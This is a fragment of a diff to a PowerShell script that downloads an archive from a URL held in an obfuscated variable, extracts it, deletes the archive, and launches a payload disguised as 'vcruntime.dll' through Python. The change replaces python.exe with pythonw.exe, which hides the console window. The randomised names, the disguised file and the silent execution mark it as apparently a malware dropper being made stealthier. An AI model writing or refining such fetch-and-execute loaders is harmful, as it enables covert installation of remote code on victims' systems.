@@ -10,6 +10,6 @@ Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf
 tar -xf $kdsf -C $cwab
 
 Remove-Item $kdsf -Force
-Start-Process -FilePath python.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab
+Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab
 
 
